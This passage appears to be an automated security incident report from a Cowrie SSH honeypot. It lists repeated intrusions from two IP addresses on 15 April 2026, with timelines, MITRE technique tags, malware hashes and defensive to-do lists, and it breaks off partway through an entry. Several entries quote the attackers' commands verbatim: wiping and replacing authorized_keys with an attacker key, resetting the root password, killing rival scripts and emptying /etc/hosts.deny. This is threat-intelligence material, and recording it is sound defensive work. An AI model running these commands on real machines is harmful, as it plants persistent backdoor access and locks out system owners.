| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:04:11` | `cowrie.session.connect` |
| `2026-04-15 19:04:11` | `cowrie.client.version` |
| `2026-04-15 19:04:11` | `cowrie.client.kex` |
| `2026-04-15 19:04:12` | `cowrie.login.success` |
| `2026-04-15 19:04:12` | `cowrie.session.params` |
| `2026-04-15 19:04:12` | `cowrie.command.input` |
| `2026-04-15 19:04:12` | `cowrie.command.failed` |
| `2026-04-15 19:04:13` | `cowrie.log.closed` |
| `2026-04-15 19:04:13` | `cowrie.session.params` |
| `2026-04-15 19:04:13` | `cowrie.command.input` |
| `2026-04-15 19:04:13` | `cowrie.session.file_download` |
| `2026-04-15 19:04:13` | `cowrie.log.closed` |
| `2026-04-15 19:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e28f984e5b

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:04 |
| **Last Seen** | 2026-04-15 19:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:04:15` | `cowrie.session.connect` |
| `2026-04-15 19:04:15` | `cowrie.client.version` |
| `2026-04-15 19:04:16` | `cowrie.client.kex` |
| `2026-04-15 19:04:16` | `cowrie.login.success` |
| `2026-04-15 19:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900dc35d3669

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:08 |
| **Last Seen** | 2026-04-15 19:13 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:08:01` | `cowrie.session.connect` |
| `2026-04-15 19:08:01` | `cowrie.client.version` |
| `2026-04-15 19:08:01` | `cowrie.client.kex` |
| `2026-04-15 19:08:07` | `cowrie.login.success` |
| `2026-04-15 19:08:07` | `cowrie.session.params` |
| `2026-04-15 19:08:07` | `cowrie.command.input` |
| `2026-04-15 19:08:07` | `cowrie.command.failed` |
| `2026-04-15 19:08:07` | `cowrie.log.closed` |
| `2026-04-15 19:08:08` | `cowrie.session.params` |
| `2026-04-15 19:08:08` | `cowrie.command.input` |
| `2026-04-15 19:08:08` | `cowrie.session.file_download` |
| `2026-04-15 19:08:08` | `cowrie.log.closed` |
| `2026-04-15 19:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c0fa98be85f

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:08 |
| **Last Seen** | 2026-04-15 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:08:11` | `cowrie.session.connect` |
| `2026-04-15 19:08:11` | `cowrie.client.version` |
| `2026-04-15 19:08:11` | `cowrie.client.kex` |
| `2026-04-15 19:08:12` | `cowrie.login.success` |
| `2026-04-15 19:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2008ad5f0f46

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:08 |
| **Last Seen** | 2026-04-15 19:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:08:47` | `cowrie.session.connect` |
| `2026-04-15 19:08:47` | `cowrie.client.version` |
| `2026-04-15 19:08:47` | `cowrie.client.kex` |
| `2026-04-15 19:08:48` | `cowrie.login.success` |
| `2026-04-15 19:08:48` | `cowrie.session.params` |
| `2026-04-15 19:08:48` | `cowrie.command.input` |
| `2026-04-15 19:08:48` | `cowrie.command.failed` |
| `2026-04-15 19:08:49` | `cowrie.log.closed` |
| `2026-04-15 19:08:49` | `cowrie.session.params` |
| `2026-04-15 19:08:49` | `cowrie.command.input` |
| `2026-04-15 19:08:49` | `cowrie.session.file_download` |
| `2026-04-15 19:08:49` | `cowrie.log.closed` |
| `2026-04-15 19:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc4882e3081

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:08 |
| **Last Seen** | 2026-04-15 19:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:08:51` | `cowrie.session.connect` |
| `2026-04-15 19:08:51` | `cowrie.client.version` |
| `2026-04-15 19:08:51` | `cowrie.client.kex` |
| `2026-04-15 19:08:52` | `cowrie.login.success` |
| `2026-04-15 19:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc2efa88ba9

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:12 |
| **Last Seen** | 2026-04-15 19:13 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:G6W3fLf4rA0N"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:12:56` | `cowrie.session.connect` |
| `2026-04-15 19:12:56` | `cowrie.client.version` |
| `2026-04-15 19:12:56` | `cowrie.client.kex` |
| `2026-04-15 19:12:57` | `cowrie.login.success` |
| `2026-04-15 19:12:57` | `cowrie.session.params` |
| `2026-04-15 19:12:57` | `cowrie.command.input` |
| `2026-04-15 19:12:57` | `cowrie.command.failed` |
| `2026-04-15 19:12:58` | `cowrie.log.closed` |
| `2026-04-15 19:12:58` | `cowrie.session.params` |
| `2026-04-15 19:12:58` | `cowrie.command.input` |
| `2026-04-15 19:12:58` | `cowrie.session.file_download` |
| `2026-04-15 19:12:58` | `cowrie.log.closed` |
| `2026-04-15 19:13:11` | `cowrie.session.params` |
| `2026-04-15 19:13:11` | `cowrie.command.input` |
| `2026-04-15 19:13:11` | `cowrie.log.closed` |
| `2026-04-15 19:13:11` | `cowrie.session.params` |
| `2026-04-15 19:13:11` | `cowrie.command.input` |
| `2026-04-15 19:13:11` | `cowrie.log.closed` |
| `2026-04-15 19:13:12` | `cowrie.session.params` |
| `2026-04-15 19:13:12` | `cowrie.command.input` |
| `2026-04-15 19:13:12` | `cowrie.session.file_download` |
| `2026-04-15 19:13:12` | `cowrie.log.closed` |
| `2026-04-15 19:13:13` | `cowrie.session.params` |
| `2026-04-15 19:13:13` | `cowrie.command.input` |
| `2026-04-15 19:13:13` | `cowrie.log.closed` |
| `2026-04-15 19:13:13` | `cowrie.session.params` |
| `2026-04-15 19:13:13` | `cowrie.command.input` |
| `2026-04-15 19:13:13` | `cowrie.log.closed` |
| `2026-04-15 19:13:14` | `cowrie.session.params` |
| `2026-04-15 19:13:14` | `cowrie.command.input` |
| `2026-04-15 19:13:14` | `cowrie.command.input` |
| `2026-04-15 19:13:14` | `cowrie.log.closed` |
| `2026-04-15 19:13:15` | `cowrie.session.params` |
| `2026-04-15 19:13:15` | `cowrie.command.input` |
| `2026-04-15 19:13:15` | `cowrie.log.closed` |
| `2026-04-15 19:13:15` | `cowrie.session.params` |
| `2026-04-15 19:13:15` | `cowrie.command.input` |
| `2026-04-15 19:13:15` | `cowrie.log.closed` |
| `2026-04-15 19:13:16` | `cowrie.session.params` |
| `2026-04-15 19:13:16` | `cowrie.command.input` |
| `2026-04-15 19:13:16` | `cowrie.log.closed` |
| `2026-04-15 19:13:16` | `cowrie.session.params` |
| `2026-04-15 19:13:16` | `cowrie.command.input` |
| `2026-04-15 19:13:17` | `cowrie.log.closed` |
| `2026-04-15 19:13:17` | `cowrie.session.params` |
| `2026-04-15 19:13:17` | `cowrie.command.input` |
| `2026-04-15 19:13:17` | `cowrie.log.closed` |
| `2026-04-15 19:13:18` | `cowrie.session.params` |
| `2026-04-15 19:13:18` | `cowrie.command.input` |
| `2026-04-15 19:13:18` | `cowrie.log.closed` |
| `2026-04-15 19:13:18` | `cowrie.session.params` |
| `2026-04-15 19:13:18` | `cowrie.command.input` |
| `2026-04-15 19:13:19` | `cowrie.log.closed` |
| `2026-04-15 19:13:19` | `cowrie.session.params` |
| `2026-04-15 19:13:19` | `cowrie.command.input` |
| `2026-04-15 19:13:19` | `cowrie.log.closed` |
| `2026-04-15 19:13:20` | `cowrie.session.params` |
| `2026-04-15 19:13:20` | `cowrie.command.input` |
| `2026-04-15 19:13:20` | `cowrie.log.closed` |
| `2026-04-15 19:13:20` | `cowrie.session.params` |
| `2026-04-15 19:13:20` | `cowrie.command.input` |
| `2026-04-15 19:13:21` | `cowrie.log.closed` |
| `2026-04-15 19:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9cbb36c4f2c

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:13 |
| **Last Seen** | 2026-04-15 19:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:13:29` | `cowrie.session.connect` |
| `2026-04-15 19:13:29` | `cowrie.client.version` |
| `2026-04-15 19:13:29` | `cowrie.client.kex` |
| `2026-04-15 19:13:30` | `cowrie.login.success` |
| `2026-04-15 19:13:31` | `cowrie.session.params` |
| `2026-04-15 19:13:31` | `cowrie.command.input` |
| `2026-04-15 19:13:31` | `cowrie.command.failed` |
| `2026-04-15 19:13:31` | `cowrie.log.closed` |
| `2026-04-15 19:13:31` | `cowrie.session.params` |
| `2026-04-15 19:13:31` | `cowrie.command.input` |
| `2026-04-15 19:13:31` | `cowrie.session.file_download` |
| `2026-04-15 19:13:31` | `cowrie.log.closed` |
| `2026-04-15 19:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799531f1ac01

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:13 |
| **Last Seen** | 2026-04-15 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:13:38` | `cowrie.session.connect` |
| `2026-04-15 19:13:38` | `cowrie.client.version` |
| `2026-04-15 19:13:38` | `cowrie.client.kex` |
| `2026-04-15 19:13:39` | `cowrie.login.success` |
| `2026-04-15 19:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354257a77410

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:15 |
| **Last Seen** | 2026-04-15 19:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:15:50` | `cowrie.session.connect` |
| `2026-04-15 19:15:50` | `cowrie.client.version` |
| `2026-04-15 19:15:50` | `cowrie.client.kex` |
| `2026-04-15 19:15:51` | `cowrie.login.success` |
| `2026-04-15 19:15:51` | `cowrie.session.params` |
| `2026-04-15 19:15:51` | `cowrie.command.input` |
| `2026-04-15 19:15:51` | `cowrie.command.failed` |
| `2026-04-15 19:15:51` | `cowrie.log.closed` |
| `2026-04-15 19:15:52` | `cowrie.session.params` |
| `2026-04-15 19:15:52` | `cowrie.command.input` |
| `2026-04-15 19:15:52` | `cowrie.session.file_download` |
| `2026-04-15 19:15:52` | `cowrie.log.closed` |
| `2026-04-15 19:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b944466ff4db

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:15 |
| **Last Seen** | 2026-04-15 19:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:15:54` | `cowrie.session.connect` |
| `2026-04-15 19:15:54` | `cowrie.client.version` |
| `2026-04-15 19:15:54` | `cowrie.client.kex` |
| `2026-04-15 19:15:55` | `cowrie.login.success` |
| `2026-04-15 19:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e1b4ab37bf

| Field | Detail |
|---|---|
| **Source IP** | `220.205.123[.]19` |
| **First Seen** | 2026-04-15 19:16 |
| **Last Seen** | 2026-04-15 19:16 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:VQUiSBadVxiY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:16:14` | `cowrie.session.connect` |
| `2026-04-15 19:16:14` | `cowrie.client.version` |
| `2026-04-15 19:16:14` | `cowrie.client.kex` |
| `2026-04-15 19:16:16` | `cowrie.login.success` |
| `2026-04-15 19:16:16` | `cowrie.session.params` |
| `2026-04-15 19:16:16` | `cowrie.command.input` |
| `2026-04-15 19:16:16` | `cowrie.command.failed` |
| `2026-04-15 19:16:16` | `cowrie.log.closed` |
| `2026-04-15 19:16:17` | `cowrie.session.params` |
| `2026-04-15 19:16:17` | `cowrie.command.input` |
| `2026-04-15 19:16:17` | `cowrie.session.file_download` |
| `2026-04-15 19:16:17` | `cowrie.log.closed` |
| `2026-04-15 19:16:30` | `cowrie.session.params` |
| `2026-04-15 19:16:30` | `cowrie.command.input` |
| `2026-04-15 19:16:30` | `cowrie.log.closed` |
| `2026-04-15 19:16:30` | `cowrie.session.params` |
| `2026-04-15 19:16:30` | `cowrie.command.input` |
| `2026-04-15 19:16:31` | `cowrie.log.closed` |
| `2026-04-15 19:16:31` | `cowrie.session.params` |
| `2026-04-15 19:16:31` | `cowrie.command.input` |
| `2026-04-15 19:16:32` | `cowrie.session.file_download` |
| `2026-04-15 19:16:32` | `cowrie.log.closed` |
| `2026-04-15 19:16:32` | `cowrie.session.params` |
| `2026-04-15 19:16:32` | `cowrie.command.input` |
| `2026-04-15 19:16:32` | `cowrie.log.closed` |
| `2026-04-15 19:16:33` | `cowrie.session.params` |
| `2026-04-15 19:16:33` | `cowrie.command.input` |
| `2026-04-15 19:16:33` | `cowrie.log.closed` |
| `2026-04-15 19:16:34` | `cowrie.session.params` |
| `2026-04-15 19:16:34` | `cowrie.command.input` |
| `2026-04-15 19:16:34` | `cowrie.command.input` |
| `2026-04-15 19:16:34` | `cowrie.log.closed` |
| `2026-04-15 19:16:35` | `cowrie.session.params` |
| `2026-04-15 19:16:35` | `cowrie.command.input` |
| `2026-04-15 19:16:35` | `cowrie.log.closed` |
| `2026-04-15 19:16:35` | `cowrie.session.params` |
| `2026-04-15 19:16:35` | `cowrie.command.input` |
| `2026-04-15 19:16:36` | `cowrie.log.closed` |
| `2026-04-15 19:16:36` | `cowrie.session.params` |
| `2026-04-15 19:16:36` | `cowrie.command.input` |
| `2026-04-15 19:16:37` | `cowrie.log.closed` |
| `2026-04-15 19:16:37` | `cowrie.session.params` |
| `2026-04-15 19:16:37` | `cowrie.command.input` |
| `2026-04-15 19:16:37` | `cowrie.log.closed` |
| `2026-04-15 19:16:38` | `cowrie.session.params` |
| `2026-04-15 19:16:38` | `cowrie.command.input` |
| `2026-04-15 19:16:38` | `cowrie.log.closed` |
| `2026-04-15 19:16:39` | `cowrie.session.params` |
| `2026-04-15 19:16:39` | `cowrie.command.input` |
| `2026-04-15 19:16:39` | `cowrie.log.closed` |
| `2026-04-15 19:16:40` | `cowrie.session.params` |
| `2026-04-15 19:16:40` | `cowrie.command.input` |
| `2026-04-15 19:16:40` | `cowrie.log.closed` |
| `2026-04-15 19:16:40` | `cowrie.session.params` |
| `2026-04-15 19:16:40` | `cowrie.command.input` |
| `2026-04-15 19:16:41` | `cowrie.log.closed` |
| `2026-04-15 19:16:41` | `cowrie.session.params` |
| `2026-04-15 19:16:41` | `cowrie.command.input` |
| `2026-04-15 19:16:42` | `cowrie.log.closed` |
| `2026-04-15 19:16:42` | `cowrie.session.params` |
| `2026-04-15 19:16:42` | `cowrie.command.input` |
| `2026-04-15 19:16:42` | `cowrie.log.closed` |
| `2026-04-15 19:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.205.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `220.205.123[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82f996e6e41c

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:18 |
| **Last Seen** | 2026-04-15 19:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
